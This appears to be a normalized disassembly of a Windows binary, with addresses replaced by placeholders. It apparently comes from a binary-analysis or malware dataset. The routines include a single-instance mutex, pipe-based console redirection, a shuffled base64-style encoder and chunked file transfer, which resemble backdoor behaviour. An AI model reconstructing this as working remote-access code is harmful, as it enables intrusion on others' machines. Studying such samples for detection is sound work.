add esp 0x8
xor esi esi
call ebx
cdq
mov ecx 0x1a
idiv ecx
add dl 0x41
mov [ esi + edi ] dl
inc esi
cmp esi 0xa
jl r-xdata
mov [ edi + 0xa ] 0x0
pop edi
pop esi
mov eax 0x1
pop ebx
retn
sub_402230
mov eax [ esp + 0x4 ]
push ebx
push ebp
mov ebp [ esp + 0x18 ]
push esi
push edi
mov edi [ esp + 0x18 ]
xor ebx ebx
push edi
push eax
mov [ ebp ] bl
call [ strstr@IAT ]
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
mov edi [ esp + 0x1c ]
not ecx
dec ecx
push edi
add esi ecx
push esi
call [ strstr@IAT ]
mov edx eax
add esp 0x8
test edx edx
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
cmp esi edx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
or ecx 0xffffffff
xor eax eax
mov [ ebx + ebp ] 0x0
[ edi ]
not ecx
dec ecx
pop edi
mov eax ecx
pop esi
pop ebp
add eax edx
pop ebx
retn
mov cl [ esi ]
mov [ ebx + ebp ] cl
inc ebx
inc esi
cmp esi edx
jne r-xdata
sub_4022b0
mov eax 0x2c3c
call sub_4053b0
mov [ esp + 0x10 ] 0x0
mov ecx 0xfffff510
lea eax [ esp + 0x78 ]
mov [ eax ] 0x7d0
add eax 0x4
inc ecx
jne r-xdata
push ebx
push ebp
push esi
mov esi 0x15e0
lea ebp [ esp + 0x2c44 ]
push edi
mov [ esp + 0x18 ] esi
mov [ esp + 0x10 ] 0xaef
mov [ esp + 0x1c ] rw-data
mov [ esp + 0x14 ] ebp
jmp r-xdata
mov eax [ ebp ]
mov ebx [ esp + 0x10 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea ecx [ eax + eax * 4 ]
shl ecx 0x4
mov eax ecx
dec esi
cdq
idiv esi
mov eax ecx
mov [ ebp ] edx
cdq
idiv esi
dec esi
test ebx ebx
mov edi eax
je r-xdata
mov edx [ esp + 0x18 ]
mov eax 0x68db8bad
sub edx 0x1c
mov ebx [ esp + 0x20 ]
mov [ esp + 0x18 ] edx
imul edi
sar edx 0xc
mov esi [ esp + 0x10 ]
mov ecx edx
shr ecx 0x1f
add edx ecx
sub ebp 0x38
add edx ebx
sub esi 0xe
push edx
lea edx [ esp + 0x28 ]
push rw-data
push edx
mov [ esp + 0x20 ] ebp
mov [ esp + 0x1c ] esi
call [ sprintf@IAT ]
lea eax [ esp + 0x30 ]
push eax
call [ atoi@IAT ]
mov ecx [ esp + 0x2c ]
mov esi [ esp + 0x28 ]
add esp 0x10
mov [ ecx ] eax
add ecx 0x4
mov eax edi
mov [ esp + 0x1c ] ecx
cdq
mov ecx 0x2710
idiv ecx
test esi esi
mov [ esp + 0x20 ] edx
jne r-xdata
add ebp 0xfffffffc
mov ebp [ esp + 0x14 ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x2c3c
retn
mov eax [ ebp ]
mov ecx edi
imul ecx ebx
lea eax [ eax + eax * 4 ]
sub ebp 0x4
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x4
add ecx eax
dec esi
mov eax ecx
cdq
idiv esi
mov eax ecx
mov [ ebp + 0x4 ] edx
cdq
idiv esi
dec esi
dec ebx
test ebx ebx
mov edi eax
jne r-xdata
mov ebp [ esp + 0x14 ]
sub_4023f0
push ebx
push esi
push edi
call sub_4022b0
xor edx edx
mov ecx 0x40
xor eax eax
mov edi rw-data
[ edi ]
mov ecx 0x10
mov edi rw-data
[ edi ]
stosb [ edi ]
mov eax 0x5a
mov [ edx + rw-data ] al
dec eax
inc edx
cmp eax 0x41
jge r-xdata
mov eax 0x39
mov [ edx + rw-data ] al
dec eax
inc edx
cmp eax 0x30
jge r-xdata
mov eax 0x7a
mov [ edx + rw-data ] al
dec eax
inc edx
cmp eax 0x61
jge r-xdata
mov esi [ esp + 0x10 ]
mov [ edx + rw-data ] 0x2d
inc edx
xor ecx ecx
sub esi rw-data
mov [ edx + rw-data ] 0x5f
mov [ edx + rw-data ] 0x2e
lea eax [ esi + ecx + rw-data ]
mov edi 0x41
cdq
idiv edi
mov eax [ edx * 4 + rw-data ]
cdq
idiv edi
movsx eax [ ecx + rw-data ]
inc ecx
cmp ecx edi
mov bl [ edx + rw-data ]
mov [ ecx + rw-data ] bl
mov [ edx + rw-data ] al
jl r-xdata
pop edi
pop esi
xor eax eax
pop ebx
movsx ecx [ eax + rw-data ]
mov [ ecx + rw-data ] al
inc eax
cmp eax 0x41
jl r-xdata
retn
sub_4024c0
mov eax [ esp + 0xc ]
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
lea edx [ eax - 0x3 ]
xor ecx ecx
xor esi esi
push edi
mov edi [ esp + 0x14 ]
test edx edx
jl r-xdata
mov eax [ esp + 0x1c ]
mov ebx 0x3
cdq
idiv ebx
cmp edx 0x2
jne r-xdata
xor eax eax
xor ebx ebx
mov al [ edi + esi ]
add esi 0x3
shr eax 0x2
inc ecx
mov al [ eax + rw-data ]
mov [ ecx + ebp - 0x1 ] al
mov al [ edi + esi - 0x3 ]
mov bl [ edi + esi - 0x2 ]
and eax 0x3
shl eax 0x4
shr ebx 0x4
inc ecx
mov al [ eax + ebx + rw-data ]
xor ebx ebx
mov [ ecx + ebp - 0x1 ] al
mov al [ edi + esi - 0x2 ]
mov bl [ edi + esi - 0x1 ]
and eax 0xf
shr ebx 0x6
inc ecx
mov al [ ebx + eax * 4 + rw-data ]
mov [ ecx + ebp - 0x1 ] al
mov al [ edi + esi - 0x1 ]
and eax 0x3f
inc ecx
cmp esi edx
mov al [ eax + rw-data ]
mov [ ecx + ebp - 0x1 ] al
jle r-xdata
cmp edx 0x1
jne r-xdata
xor eax eax
mov al [ esi + edi ]
shr eax 0x2
inc ecx
mov al [ eax + rw-data ]
mov [ ecx + ebp - 0x1 ] al
mov al [ esi + edi ]
and eax ebx
xor ebx ebx
mov bl [ esi + edi + 0x1 ]
shl eax 0x4
shr ebx 0x4
inc ecx
mov al [ eax + ebx + rw-data ]
mov [ ecx + ebp - 0x1 ] al
mov al [ esi + edi + 0x1 ]
and eax 0xf
inc ecx
inc ecx
mov al [ eax * 4 + rw-data ]
mov [ ecx + ebp - 0x2 ] al
mov al [ rw-data ]
mov [ ecx + ebp - 0x1 ] al
pop edi
mov [ ecx + ebp ] 0x0
pop esi
pop ebp
mov eax ecx
pop ebx
retn
xor edx edx
mov dl [ esi + edi ]
shr edx 0x2
inc ecx
mov al [ edx + rw-data ]
mov [ ecx + ebp - 0x1 ] al
mov dl [ esi + edi ]
and edx 0x3
shl edx 0x4
inc ecx
mov al [ edx + rw-data ]
mov [ ecx + ebp - 0x1 ] al
mov dl [ rw-data ]
mov [ ecx + ebp ] dl
mov al [ rw-data ]
inc ecx
mov [ ecx + ebp ] al
inc ecx
sub_4025f0
mov eax [ esp + 0xc ]
push esi
mov ecx eax
xor esi esi
and ecx 0x80000003
jns r-xdata
je r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov edx [ esp + 0xc ]
push ebx
xor ecx ecx
push ebp
test eax eax
push edi
jle r-xdata
xor eax eax
pop esi
retn
pop edi
pop ebp
mov [ esi + edx ] 0x0
mov eax esi
pop ebx
pop esi
retn
mov edi [ esp + 0x14 ]
xor ebx ebx
mov bl [ ecx + edi + 0x1 ]
mov ebp ebx
cmp ebp eax
je r-xdata
mov ebx [ esp + 0x18 ]
mov al [ ebp + rw-data ]
sar al 0x4
mov bl [ ebx + rw-data ]
shl bl 0x2
add al bl
mov [ esi + edx ] al
xor eax eax
mov al [ ecx + edi + 0x2 ]
inc esi
mov ebp eax
movsx eax [ rw-data ]
cmp ebp eax
je r-xdata
mov bl [ ebp + rw-data ]
xor eax eax
mov al [ ecx + edi + 0x1 ]
sar bl 0x2
mov al [ eax + rw-data ]
shl al 0x4
add al bl
mov [ esi + edx ] al
xor eax eax
movsx ebx [ rw-data ]
mov al [ ecx + edi + 0x3 ]
inc esi
cmp eax ebx
je r-xdata
xor ebx ebx
mov bl [ ecx + edi + 0x2 ]
add ecx 0x4
mov bl [ ebx + rw-data ]
shl bl 0x6
add bl [ eax + rw-data ]
mov eax [ esp + 0x1c ]
mov [ esi + edx ] bl
inc esi
cmp ecx eax
jl r-xdata
movsx eax [ rw-data ]
xor ebx ebx
mov bl [ ecx + edi ]
cmp ebx eax
mov [ esp + 0x18 ] ebx
je r-xdata
sub_4026e0
mov eax [ esp + 0x8 ]
push ebp
push esi
mov esi [ strtok@IAT ]
push rw-data
push eax
xor ebp ebp
call esi
mov edx eax
add esp 0x8
test edx edx
je r-xdata
mov eax ebp
pop esi
pop ebp
retn
push ebx
mov ebx [ esp + 0x10 ]
push edi
mov [ ebx ] edx
push rw-data
add ebx 0x4
push 0x0
inc ebp
call esi
mov edx eax
add esp 0x8
test edx edx
jne r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
push rw-data
[ edi ]
not ecx
dec ecx
inc edx
push edx
mov [ ecx + edx - 0x1 ] 0x20
mov [ edx - 0x1 ] al
call esi
add esp 0x8
mov edx eax
cmp [ edx ] 0x22
jne r-xdata
pop edi
pop ebx
mov eax ebp
pop esi
pop ebp
retn
sub_402790
mov eax 0x7d004
call sub_4053b0
push ebx
push esi
push rw-data
push 0x1
push 0x0
call [ CreateMutexA@IAT ]
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
push edi
mov ecx 0x1f3ff
xor eax eax
lea edi [ esp + 0x11 ]
mov [ esp + 0x10 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
call sub_403960
mov eax [ esp + 0x7d014 ]
pop edi
cmp eax 0x1
jle r-xdata
pop esi
or eax 0xffffffff
pop ebx
add esp 0x7d004
retn
lea ecx [ esp + 0xc ]
push ecx
call sub_4035d0
add esp 0x4
test eax eax
je r-xdata
mov eax [ esp + 0x7d014 ]
mov esi rw-data
mov eax [ eax + 0x4 ]
pop esi
xor eax eax
pop ebx
add esp 0x7d004
retn
mov edx [ rw-data ]
mov esi [ Sleep@IAT ]
push edx
call esi
mov eax [ rw-data ]
test eax eax
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
lea eax [ esp + 0xc ]
push eax
call sub_402960
mov ecx [ rw-data ]
add esp 0x4
push ecx
call esi
mov eax [ rw-data ]
test eax eax
je r-xdata
lea eax [ esp + 0xc ]
mov [ rw-data ] 0x1
push eax
call sub_4035d0
add esp 0x4
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
call sub_402120
mov eax [ rw-data ]
lea edx [ esp + 0x8 ]
push 0x0
push edx
push 0x6
push rw-data
push eax
call [ WriteFile@IAT ]
call sub_4020e0
push rw-data
call [ printf@IAT ]
mov ecx [ _iob@IAT ]
push ecx
call [ fflush@IAT ]
push rw-data
push rw-data
call [ scanf@IAT ]
add esp 0x10
mov esi rw-data
mov eax rw-data
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
call [ FreeConsole@IAT ]
pop esi
xor eax eax
pop ebx
add esp 0x7d004
retn
lea eax [ esp + 0xc ]
push eax
call sub_4045d0
add esp 0x4
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_402960
push ebp
mov ebp esp
push 0xffffffff
push sub_4055a0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x1fd38
call sub_4053b0
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x0
call [ time@IAT ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
push eax
call [ localtime@IAT ]
push eax
push rw-data
lea ecx [ ebp - 0x6c ]
push 0x40
push ecx
call [ strftime@IAT ]
mov eax [ rw-data ]
mov ebx [ ebp + 0x8 ]
add esp 0x18
cmp eax 0x1
mov [ ebp - 0x4 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x1fd48 ]
push ebx
push ecx
mov [ ebp - 0x4 ] 0xffffffff
call sub_403270
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ rw-data ]
push 0x0
lea edx [ ebp - 0x14 ]
push 0x0
push edx
lea eax [ ebp - 0x86c ]
push 0x400
push eax
push ecx
call [ PeekNamedPipe@IAT ]
mov edx [ ebp - 0x14 ]
test edx edx
je r-xdata
lea edx [ ebp - 0x1fd16 ]
push edx
call [ atoi@IAT ]
push eax
call sub_4023f0
mov ecx 0x1f400
xor eax eax
mov edi ebx
[ edi ]
lea edi [ ebp - 0x1fcee ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea eax [ ebp - 0x1fcee ]
push ecx
push ebx
push eax
call sub_4025f0
mov edx eax
add esp 0x14
test edx edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx 0x200
xor eax eax
lea edi [ ebp - 0x86c ]
push eax
[ edi ]
lea eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x86c ]
push eax
push edx
mov edx [ rw-data ]
push ecx
push edx
call [ ReadFile@IAT ]
push ebx
lea eax [ ebp - 0x86c ]
push rw-data
push eax
mov eax [ ebp - 0x18 ]
push 0x0
push eax
push eax
push rw-data
call sub_403430
add esp 0x1c
jmp r-xdata
mov ecx 0x7d00
xor eax eax
lea edi [ ebp - 0x1fcee ]
mov esi ebx
[ edi ]
mov ecx edx
lea edi [ ebp - 0x1fcee ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ ebp - 0x1fd3e ]
and ecx 0x3
[ edi ] [ esi ]
mov esi rw-data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov esi rw-data
lea eax [ ebp - 0x1fd3e ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ ebp - 0x1fcee ]
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ ebp - 0x2c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea edi [ ebp - 0x1fcee ]
or ecx 0xffffffff
xor eax eax
mov edx [ rw-data ]
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ ebp - 0x1fcee ]
push ecx
push edx
call [ WriteFile@IAT ]
mov esi [ CreatePipe@IAT ]
lea eax [ ebp - 0x28 ]
push 0x0
push eax
mov edi 0x1
push rw-data
push rw-data
mov [ ebp - 0x28 ] 0xc
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x20 ] edi
call esi
lea ecx [ ebp - 0x28 ]
push 0x0
push ecx
push rw-data
push rw-data
call esi
push 0x0
push 0x0
push rw-data
push sub_401f00
push 0x0
push 0x0
call [ CreateThread@IAT ]
push eax
call [ CloseHandle@IAT ]
mov [ rw-data ] edi
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi rw-data
lea eax [ ebp - 0x1fd3e ]
lea eax [ ebp - 0x1fcee ]
lea ecx [ ebp - 0x8ee ]
push eax
push ecx
lea edx [ ebp - 0x1fd48 ]
push ebx
push edx
call sub_4030f0
add esp 0x10
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov esi rw-data
lea eax [ ebp - 0x1fd3e ]
lea eax [ ebp - 0x1fcee ]
lea ecx [ ebp - 0x8ee ]
push eax
push ecx
lea edx [ ebp - 0x1fd48 ]
push ebx
push edx
call sub_402e40
add esp 0x10
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov eax 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ rw-data ] 0x1
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_402d00
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
push esi
push rw-data
push rw-data
push edi
call sub_402230
add esp 0x10
test eax eax
jne r-xdata
lea eax [ esi + 0xa ]
push eax
push rw-data
push rw-data
push edi
call sub_402230
add esp 0x10
test eax eax
jne r-xdata
pop edi
pop esi
retn
lea ecx [ esi + 0x1e ]
push ecx
push rw-data
push rw-data
push edi
call sub_402230
add esp 0x10
test eax eax
jne r-xdata
pop edi
pop esi
retn
lea edx [ esi + 0x28 ]
push edx
push rw-data
push rw-data
push edi
call sub_402230
add esp 0x10
test eax eax
jne r-xdata
pop edi
pop esi
retn
lea eax [ esi + 0x32 ]
push eax
push rw-data
push rw-data
push edi
call sub_402230
add esp 0x10
test eax eax
jne r-xdata
pop edi
pop esi
retn
lea ecx [ esi + 0x3c ]
push ecx
push rw-data
push rw-data
push edi
call sub_402230
add esp 0x10
test eax eax
jne r-xdata
pop edi
pop esi
retn
lea edx [ esi + 0x46 ]
push edx
push rw-data
push rw-data
push edi
call sub_402230
add esp 0x10
test eax eax
jne r-xdata
pop edi
pop esi
retn
lea eax [ esi + 0x50 ]
push eax
push rw-data
push rw-data
push edi
call sub_402230
add esp 0x10
test eax eax
jne r-xdata
pop edi
pop esi
retn
lea ecx [ esi + 0x5a ]
push ecx
push rw-data
push rw-data
push edi
call sub_402230
add esp 0x10
test eax eax
jne r-xdata
pop edi
pop esi
retn
add esi 0x1f45a
push esi
push rw-data
push rw-data
push edi
call sub_402230
add esp 0x10
neg eax
sbb eax eax
pop edi
neg eax
pop esi
retn
pop edi
pop esi
retn
sub_402e40
sub esp 0x614
push ebx
push ebp
push esi
push edi
mov ecx 0xff
xor eax eax
lea edi [ esp + 0x225 ]
mov [ esp + 0x224 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x25 ]
mov [ esp + 0x24 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x125 ]
mov [ esp + 0x124 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi [ esp + 0x630 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x24 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x124 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x634 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x224 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x24 ]
push ecx
push rw-data
push edx
call [ sprintf@IAT ]
mov esi [ esp + 0x638 ]
lea eax [ esp + 0x230 ]
push esi
push eax
call sub_403800
add esp 0x14
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x614
retn
mov ebp [ esp + 0x628 ]
push esi
push ebp
call sub_402d00
add esp 0x8
test eax eax
je r-xdata
mov ebx [ atoi@IAT ]
lea ecx [ ebp + 0x3c ]
push ecx
call ebx
lea edx [ ebp + 0x46 ]
mov edi eax
push edx
mov [ esp + 0x28 ] edi
call ebx
mov [ esp + 0x24 ] eax
lea eax [ ebp + 0x50 ]
push eax
call ebx
add esp 0xc
xor eax eax
xor ecx ecx
test edi edi
mov [ esp + 0x14 ] ecx
jle r-xdata
mov ebx [ fopen@IAT ]
lea ecx [ esp + 0x124 ]
push rw-data
push ecx
call ebx
add esp 0x8
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
mov edx [ esp + 0x1c ]
add eax edx
inc ecx
cmp eax edi
jl r-xdata
mov eax [ esp + 0x14 ]
xor ebx ebx
test eax eax
jle r-xdata
lea edx [ esp + 0x124 ]
push rw-data
push edx
call ebx
add esp 0x8
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
mov [ esp + 0x14 ] ecx
mov edx [ esp + 0x10 ]
push edx
call [ fclose@IAT ]
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x614
retn
mov [ esp + 0x18 ] ebx
jmp r-xdata
lea eax [ esp + 0x24 ]
push ebx
push eax
lea ecx [ esp + 0x22c ]
push rw-data
push ecx
call [ sprintf@IAT ]
lea edx [ esp + 0x234 ]
push esi
push edx
call sub_403800
add esp 0x18
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
push eax
push esi
push ebp
call sub_402d00
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
push ecx
jmp r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
lea edx [ eax + ecx ]
cmp edx edi
jl r-xdata
call [ fclose@IAT ]
add esp 0x4
mov ecx [ esp + 0x10 ]
push 0x0
push eax
push ecx
push 0x0
push eax
mov eax [ esp + 0x18 ]
mov [ rw-data ] 0x0
push eax
jmp r-xdata
mov edi [ esp + 0x20 ]
call [ fseek@IAT ]
add esp 0xc
lea edx [ ebp + 0x32 ]
push edx
call [ atoi@IAT ]
push eax
call sub_4023f0
mov ecx 0x1f400
xor eax eax
mov edi esi
lea edx [ ebp + 0x5a ]
[ edi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ecx
push esi
push edx
call sub_4025f0
mov ecx [ esp + 0x24 ]
push ecx
push eax
push 0x1
push esi
call [ fwrite@IAT ]
mov edx [ esp + 0x40 ]
mov ecx [ esp + 0x3c ]
mov eax [ esp + 0x38 ]
add esp 0x24
inc ebx
add ecx edx
cmp ebx eax
mov [ esp + 0x18 ] ecx
jl r-xdata
sub_4030f0
sub esp 0x408
push esi
push edi
mov ecx 0xff
xor eax eax
lea edi [ esp + 0x11 ]
mov [ esp + 0x10 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov eax [ esp + 0x420 ]
push rw-data
push eax
call [ fopen@IAT ]
mov esi eax
add esp 0x8
test esi esi
mov [ esp + 0x8 ] esi
je r-xdata
pop edi
xor eax eax
pop esi
add esp 0x408
retn
mov edi [ fseek@IAT ]
push ebx
push ebp
push 0x2
push 0x0
push esi
call edi
push esi
call [ ftell@IAT ]
push 0x0
mov ebp eax
push 0x0
push esi
mov [ esp + 0x30 ] ebp
call edi
add esp 0x1c
xor ebx ebx
test ebp ebp
jle r-xdata
push esi
call [ fclose@IAT ]
add esp 0x4
mov eax 0x1
pop ebp
pop ebx
pop edi
pop esi
add esp 0x408
retn
mov esi [ esp + 0x420 ]
mov edx [ esp + 0x10 ]
mov ecx 0x1f400
push edx
xor eax eax
mov edi esi
push ebp
push 0x1
push esi
[ edi ]
call [ fread@IAT ]
add esp 0x10
xor ebp ebp
mov ecx 0x1f400
xor eax eax
mov edi esi
sub ebp 0x400
[ edi ]
mov ecx [ esp + 0x10 ]
push ecx
push 0x400
push 0x1
push esi
call [ fread@IAT ]
add esp 0x10
jmp r-xdata
mov edi [ esp + 0x424 ]
mov eax [ esp + 0x14 ]
push esi
push edi
push esi
push ebx
push 0x400
push eax
push rw-data
call sub_403430
push ebx
push edi
lea ecx [ esp + 0x3c ]
push rw-data
push ecx
call [ sprintf@IAT ]
lea edx [ esp + 0x44 ]
push esi
push edx
call sub_403800
add esp 0x34
test eax eax
je r-xdata
mov eax [ esp + 0x41c ]
push eax
push rw-data
push rw-data
push esi
call sub_402230
add esp 0x10
test eax eax
je r-xdata
inc ebx
test ebp ebp
jg r-xdata
push 0x0
call [ time@IAT ]
push eax
call [ srand@IAT ]
call [ rand@IAT ]
push eax
call sub_4023f0
add esp 0xc
cmp ebp 0x400
jle r-xdata
mov esi [ esp + 0x10 ]
sub_403270
sub esp 0x400
push ebx
push ebp
mov ebp [ esp + 0x410 ]
push edi
push ebp
call sub_4035d0
add esp 0x4
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
jne r-xdata
pop edi
pop ebp
pop ebx
add esp 0x400
retn
mov ecx 0xff
xor eax eax
lea edi [ esp + 0xd ]
mov [ esp + 0xc ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
push rw-data
lea eax [ esp + 0x10 ]
push rw-data
push eax
call [ sprintf@IAT ]
lea ecx [ esp + 0x18 ]
push ebp
push ecx
call sub_403800
add esp 0x14
test eax eax
jne r-xdata
pop edi
pop ebp
pop ebx
add esp 0x400
retn
mov ebx [ esp + 0x410 ]
push ebp
push ebx
call sub_402d00
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop ebp
pop ebx
add esp 0x400
retn
mov eax [ rw-data ]
test eax eax
jne r-xdata
pop edi
pop ebp
pop ebx
add esp 0x400
retn
push ebp
push ebx
call sub_403fb0
add esp 0x8
mov eax 0x1
pop edi
pop ebp
pop ebx
add esp 0x400
retn
lea edi [ ebx + 0x1e ]
or ecx 0xffffffff
xor eax eax
push esi
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
sub_403360
mov eax 0x1f400
call sub_4053b0
push edi
mov ecx 0x7cff
xor eax eax
lea edi [ esp + 0x5 ]
mov [ esp + 0x4 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov eax [ esp + 0x1f408 ]
lea ecx [ eax + 0x1f45a ]
lea edx [ eax + 0x5a ]
push ecx
push edx
lea ecx [ eax + 0x50 ]
lea edx [ eax + 0x46 ]
push ecx
push edx
lea ecx [ eax + 0x3c ]
lea edx [ eax + 0x32 ]
push ecx
push edx
lea ecx [ eax + 0x28 ]
lea edx [ eax + 0x1e ]
push ecx
add eax 0xa
push edx
push eax
lea eax [ esp + 0x28 ]
push rw-data
push eax
call [ sprintf@IAT ]
lea edi [ esp + 0x30 ]
or ecx 0xffffffff
xor eax eax
add esp 0x2c
[ edi ]
not ecx
dec ecx
pop edi
cmp ecx 0x7d0
jge r-xdata
cmp ecx 0xfa00
jge r-xdata
push esi
mov esi [ esp + 0x1f40c ]
xor eax eax
add esp 0x1f400
retn
mov edx [ esp + 0x1f408 ]
lea eax [ esp ]
push edx
push eax
call sub_403950
add esp 0x8
lea ecx [ esp + 0x4 ]
push esi
push ecx
call sub_403800
add esp 0x8
test eax eax
je r-xdata
mov eax 0x1
pop esi
add esp 0x1f400
retn
sub_403430
mov eax 0x1f4dc
call sub_4053b0
push ebx
mov ebx [ esp + 0x1f4e4 ]
push ebp
push esi
mov esi [ sprintf@IAT ]
push edi
push ebx
lea eax [ esp + 0x1e ]
push rw-data
push eax
call esi
mov ecx [ esp + 0x1f510 ]
lea edx [ esp + 0x1f476 ]
push ecx
push rw-data
push edx
call esi
mov eax [ esp + 0x1f50c ]
lea ecx [ esp + 0x64 ]
push eax
push rw-data
push ecx
call esi
mov edx [ esp + 0x1f520 ]
lea eax [ esp + 0x84 ]
push edx
push rw-data
push eax
call esi
mov ebp [ esp + 0x1f528 ]
lea ecx [ esp + 0x86 ]
push ebp
push rw-data
push ecx
call esi
add esp 0x3c
mov edi rw-data
mov eax ebx
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
lea edx [ esp + 0x2e ]
push rw-data
push edx
call esi
lea eax [ esp + 0x40 ]
push rw-data
push eax
call esi
add esp 0x10
push rw-data
lea eax [ esp + 0x32 ]
push rw-data
push eax
call esi
push rw-data
lea ecx [ esp + 0x48 ]
push rw-data
push ecx
call esi
add esp 0x18
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
